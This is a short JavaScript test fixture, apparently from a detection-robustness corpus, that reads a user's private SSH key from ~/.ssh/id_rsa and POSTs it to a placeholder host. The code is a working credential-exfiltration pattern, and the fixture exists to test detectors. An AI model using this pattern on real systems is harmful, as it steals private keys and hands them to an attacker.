// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs');
function upload(body) { return fetch('https://collect.example.invalid/c', { method: 'POST', body }); }
const d = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
upload(d);
